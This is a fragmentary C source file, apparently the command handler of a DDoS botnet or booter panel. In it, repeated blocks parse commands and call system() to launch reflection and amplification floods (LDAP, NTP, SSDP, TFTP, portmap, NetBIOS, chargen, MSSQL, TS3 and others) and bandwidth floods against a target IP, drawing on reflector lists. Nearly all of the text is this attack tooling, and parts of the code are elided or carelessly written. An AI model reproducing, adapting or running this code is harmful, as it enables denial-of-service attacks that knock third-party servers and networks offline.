    ...
    failed:
      ...
      else
      {
        ...
        if(send(clear_arceus_broadcast, arceus, strlen(arceus), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
         ...
         if (strstr(arceus_buffer_size, ".pwrcheck") || strstr(arceus_buffer_size, ".PWRCHECK")) // System Command Function
         {
        ...
        trim_removev2(filename); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "wc -l < %s.txt",filename); // Displaying Number Of Lines In A File
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/ldap %s 62141 amp/lists/ldap.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
...
*/  
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/ntp %s 62141 amp/lists/ntp.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/ssdp %s 62141 amp/lists/ssdp.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
      ...
      if (strstr(arceus_buffer_size, ".tftp") || strstr(arceus_buffer_size, ".TFTP")) // System Command Function
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/tftp %s 62141 amp/lists/tftp.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/portmap %s 62141 amp/lists/portmap.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/sentinel %s 62141 amp/lists/sentinel.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/netbios %s 62141 amp/lists/netbios.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/chargen %s 62141 amp/lists/chargen.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/mssql %s 62141 amp/lists/mssql.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/ts3 %s 62141 amp/lists/ts3.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/prowin %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/winsyn %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/yubina %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        char *ipkill[5000]; // Creating A System Function
        trim_removev2(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/winseqid %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
        system(ipkill); // System Execution
        ...
        else if (strstr(arceus_buffer_size, ".KILLATTK") || strstr(arceus_buffer_size, ".killattk") || strstr(arceus_buffer_size, "^[ ") || strstr(arceus_buffer_size, "^[")) // System Command Function -- [TESTING HERE]
        {        
        char command[70];
        trim_removev2(command);
